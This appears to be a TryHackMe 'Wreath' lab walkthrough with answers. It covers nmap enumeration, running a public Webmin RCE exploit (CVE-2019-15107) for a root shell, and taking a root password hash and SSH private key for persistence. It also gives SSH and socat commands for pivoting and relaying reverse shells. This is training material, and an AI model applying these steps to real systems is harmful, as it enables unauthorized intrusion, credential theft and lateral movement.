<h1 align="center"><a href=https://tryhackme.com/room/wreath">Wreath</a></h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/99ce5f04-2c0b-4c82-92b4-f6752d0de4c5"><br></p>

<br>
<h2>Task 1 . Intro | Introduction</h2>
<br>

<p><em>Answer the question below</em></p>

<p>1.1. <em>Read the introduction</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . Intro | Accessing the Network</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>2.1. <em>Click on the green download button on the access page and save the configuration pack somewhere on your local machine. If this does not work then you may have to click on the "Regenerate" button first, then give it ten seconds before attempting to download the pack.</em><br>
<code>No answer needed</code></p>

<br>
<p>2.2. <em>This should give you access to the Wreath network!</em><br>
<code>No answer needed</code></p>

<br>
<p>2.3. <em>Without closing the connection, open a new terminal (Ctrl + T in most cases). This is the easiest way (technically speaking) to run the OpenVPN client in the background whilst still being able to use the CLI. If you are comfortable using a terminal multiplexer (e.g. Tmux) to create a connection in the background then doing so would be a more elegant solution.</em><br>
<code>No answer needed</code></p>

<br>
<p>2.4. <em>Finally, the "Network Uptime" field at the bottom right of the network map indicates how long the network has been awake for. This is not necessarily the time since the last reset.</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 3 . Intro | Backstory</h2>
<br>

<p><em>Answer the question below</em></p>

<p>3.1. <em>I´ll do it</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 4 . Intro | Briefing</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>4.1. <em>Let´s go!</em><br>
<code>No answer needed</code></p>

<br>
<p>4.2. <emBefore we start, if you are using Kali, make sure that it's up to date: <code>sudo apt update && sudo apt upgrade</code> This should not be necessary on the AttackBox.</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 5 . Webserver | Enumeration</h2>
<p>As with any attack, we first begin with the enumeration phase. Completing the Nmap room (if you haven't already) will help with this section.<br>

Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let's start by performing a port scan on the first 15000 ports of this IP.<br>

Note: Here (and in general), it's a good idea to save your scan results to a file so you don't have to re-run the same scan twice.</p>

<p><em>Answer the questions below</em></p>

<p>5.1. <em>How many of the first 15000 ports are open on the target?</em> Hint: nmap -p-15000 -vv TARGET_IP -oG initial-scan<br>
<code>4</code></p>

<p>5.2. <em>Perform a service scan on these open ports. What OS does Nmap think is running?</em> Hint: This will be given by the webserver. Note that Nmap is unlikely to get a valid result with -O, so use the headers from the webserver to ascertain the OS.<br>
<code>CentOS</code>

<p>5.3. <em>Okay, we know what we're dealing with. Open the IP in your browser -- what site does the server try to redirect you to?</em><br>
<code>https://thomaswreath.thm</code>

<p>You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!</p>

<p>Add it to your hosts file manually. This can be accomplished by editing the /etc/hosts file on Linux/MacOS, or C:\Windows\System32\drivers\etc\hosts on Windows, to include the IP address, followed by a tab, then the domain name. Note: this must be done as root/Administrator.</p>


<p>5.4. <em>It should look something like this when done, although the IP address and domain name will be different:</em> <code>10.10.10.10 example.thm</code> Hint: Make sure you don't include the https://. It should just be domainname.thm<br>
<code>No answer needed</code>

```bash
:~$ nmap -sV -p 1-10000 -T4 xx.xxx.xxx.200
...
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
```

<img width="1321" height="259" alt="image" src="https://github.com/user-attachments/assets/a3eb68c5-5cbb-4943-99d2-cd00c42c073c" />

<img width="1321" height="259" alt="image" src="https://github.com/user-attachments/assets/a67fbe3d-9140-403f-83b7-55122c4efadf" />



```bash
:~$ nmap -sC -sV -Pn -n -p 22,80,443,10000 -T4 xx.xxx.xxx.200
...
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
...
80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2026-01-12...
|_Not valid after:  2027-01-12...
|_http-title: Thomas Wreath | Developer
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
10000/tcp open  ssl/http MiniServ 1.890 (Webmin httpd)
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on prod-serv
| Not valid before: 2020-11-07...
|_Not valid after:  2025-11-06...
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.890
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.78 seconds
```


<p>5.5. <em>Read through the text on the page. What is Thomas' mobile phone number?</em><<br>
<code>+447821548812</code>/p>
  
<img width="1320" height="294" alt="image" src="https://github.com/user-attachments/assets/e0c7ea50-8a4d-49cf-8361-32b224c613e3" />

<br>
<br>
<br>

<p>Let's have a look at the highest open port.</p>

<p>5.6. <em>Look back at your service scan results: what server version does Nmap detect as running here?</em><br>
<code>MiniServ 1.890 (Webmin httpd)</code></p>

<br>
<p>5.7. <em>Put your answer to the last question into Google. It appears that this service is vulnerable to an unauthenticated remote code execution exploit! What is the CVE number for this exploit?</em><br>
<code>CVE-2019-15107</code></p>

<img width="815" height="201" alt="image" src="https://github.com/user-attachments/assets/dc4e28c0-737b-44ec-9260-087fc681acca" />

<br>
<br>
<br>

<p>5.8. <em>We have everything we need to break into this machine, so let's get going!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 6 . Webserver | Exploitation</h2>
<br>


<p><em>Answer the questions below</em></p>

<p>6.1. <em>Run the exploit and obtain a pseudoshell on the target!</em><br>
<code>No answer needed</code></p>

```bash
:~/wreath$ git clone https://github.com/MuirlandOracle/CVE-2019-15107
```

```bash
:~/wreath/CVE-2019-15107$ ls
CVE-2019-15107.py  LICENSE  README.md  requirements.txt
```

```bash
(venv) ...:~$ python3 -m venv venv
```

```bash
(venv) ...:~$ source venv/bin/activate
```

```bash
(venv) ...:~$ pip3 install -r requirements.txt
```

```bash
(venv) ...:~$ ./CVE-2019-15107.py xx.xxx.xxx.200
```

<img width="1322" height="393" alt="image" src="https://github.com/user-attachments/assets/5671e026-fb9e-42e9-a032-42dfa4751e81" />

<br>
<br>
<br>
<p>6.2. <em>Which user was the server running as?</em></em><br>
<code>root</code></p>

<br>
<p>6.3. <em>Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process. Before we do though: nice though this pseudoshell is, it's not a full reverse shell. Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.</em><br>
<code>No answer needed</code></p>



<img width="1351" height="583" alt="image" src="https://github.com/user-attachments/assets/6288b75e-800f-4c84-9638-2362b7f4fbe9" />

<br>
<br>
<br>
<p>6.4. <em>Optional: Stabilise the reverse shell. There are several techniques for doing this detailed here.</em><br>
<code>No answer needed</code></p>

<img width="1342" height="383" alt="image" src="https://github.com/user-attachments/assets/26c33026-5263-4a3e-aba3-2a12f4dcfae3" />

<br>
<br>
<br>
<p>6.5. <em>Now for a little post-exploitation! What is the root user's password hash?</em><be>
<code>$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1</code></br>

<img width="1344" height="95" alt="image" src="https://github.com/user-attachments/assets/b5b5dd16-ec57-48d9-9d2c-90f8b0b41d95" />


<br>
<br>
<br>
<p>6.6. <em>You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box. What is the full path to this file?</em><br><code>/root/.ssh/id_rsa</code></p>


<img width="1344" height="535" alt="image" src="https://github.com/user-attachments/assets/a0bdac1c-d54e-4555-a481-1d73551b3ef9" />


<br>
<br>
<br>
<p>6.7. <em>Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to obtain persistent access to the box. We have everything we need for now. Let's move on to the next section: Pivoting!</em><br>
<code>/root/.ssh/id_rsa</code></p>

<br>
<h2>Task 7 . Pivoting | What is Pivoting?</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>7.1. <em>Read the pivoting introduction</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 8 . Pivoting | High-Level Overview</h2>
<br>
<p><em>Answer the questions below</em></p>

<p>8.1. <em>Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?</em><br>
<code>Tunnelling</code></p>

<br>
<p>8.2. <em>Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?</em><br>
<code>portfwd</code></p>


<br>
<h2>Task 9 . Pivoting | Enumeration</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>9.1. <em>What is the absolute path to the file containing DNS entries on Linux?</em><br>
<code>/etc/resolv.conf</code></p>

<br>
<p>9.2. <em>What is the absolute path to the hosts file on Windows?</em><br>
<code>C:\Windows\System32\drivers\etc\hosts</code></p>

<br>
<p>9.3. <em>How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?</em><br>
<code>for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done</code></p>


<br>
<h2>Task 10 . Proxychains & FoxyProxy</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>10.1. <em>What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?</em><br>
<code>socks4 127.0.0.1 4242</code></p>

<br>
<p>10.2. <em>What command would you use to telnet through a proxy to 172.16.0.100:23?</em><br>
<code>proxychains telnet 172.16.0.100 23</code></p>


<br>
<p>10.3. <em>You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?</em><br>
<code>FP</code></p>

<br>
<h2>Task 11 . Pivoting | SSH Tunnelling/ Port Forwarding</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>11.1. <em>If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?</em><br>
<code>L</code></p>

<br>
<p>11.2. <em>Which switch combination can be used to background an SSH port forward or tunnel?</em><br>
<code>-fN</code></p>

<br>
<p>11.3. <em>It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?</em><br>
<code>Nay</code></p>

<br>
<p>11.4. <em>What command would you use to create a pair of throwaway SSH keys for a reverse connection?</em><br>
<code>ssh-keygen</code></p>

<br>
<p>11.5. <em>If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")</em><br>
<code>ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN</code></p>

<br>
<p>11.6. <em>What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?</em><br>
<code>ssh -D 8000 user@target.thm -fN</code></p>

<br>
<p>11.7. <em>If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.</em><br>
<code>ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN</code></p>

<br>
<h2>Task 12 . Pivoting | plink.exe</h2>
<br>

<p><em>Answer the question below</em></p>

<p>12.1. <em>What tool can be used to convert OpenSSH keys into PuTTY style keys?</em><br>
<code>puttygen</code></p>


<br>
<h2>Task 13 . Pivoting | Socat</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>13.1. <em>Which socat option allows you to reuse the same listening port for more than one connection?</em><br>
<code>reuseaddr</code></p>

<br>
<p>13.2. <em>If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? Use TCP port 8000 for the server listener, and do not background the process.</em><br>
<code>./socat tcp-l:8000 tcp:172.16.0.200:443</code></p>

<br>
<p>13.3. <em>What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?</em><br>
<code>./socat tcp-l:222,,fork,reuseaddr tcp:172.16.0.100:22 &</code></p>

<br>
<p>13.4. <em>Bonus Question (Optional): Try to create an encrypted port forward or relay using the OPENSSL options in socat. Task 7 of the shells room may help with this.</em><br>
<code>No answer needed</code></p>

```bash
[root@prod-serv ~]# arp -a
ip-xx-xxx-xxx-1.eu-west-1.compute.internal (xx.xxx.xxx.1) at 0a:3b:ed:83:91:8b [ether] on eth0
ip-xx-xxx-xxx-150.eu-west-1.compute.internal (xx.xxx.xxx.150) at 0a:8d:d6:41:d0:8d [ether] on eth0
ip-xx-xxx-xxx-250.eu-west-1.compute.internal (xx.xxx.xxx.250) at 0a:f7:50:4b:47:4f [ether] on eth0
ip-xx-xxx-xxx-100.eu-west-1.compute.internal (xx.xxx.xxx.100) at 0a:a7:d7:fd:db:7f [ether] on eth0
```

<img width="1299" height="126" alt="image" src="https://github.com/user-attachments/assets/66d36f5c-e208-44d3-a661-bde2ad8ca51c" />

<br>
<br>
<br>

```bash
[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 xx.xxx.xxx.${i} | grep "bytes from" &); done
64 bytes from xx.xxx.xxx.1: icmp_seq=1 ttl=64 time=1.66 ms
64 bytes from xx.xxx.xxx.200: icmp_seq=1 ttl=64 time=0.045 ms
64 bytes from xx.xxx.xxx.250: icmp_seq=1 ttl=64 time=0.476 ms
```


<img width="1303" height="221" alt="image" src="https://github.com/user-attachments/assets/673e6ad5-2c30-4c83-87b8-9579f397027a" />


```bash
[root@prod-serv ~]# getent hosts
127.0.0.1       localhost localhost.localdomain localhost4 localhost4.localdomain4
127.0.0.1       localhost localhost.localdomain localhost6 localhost6.localdomain6
```





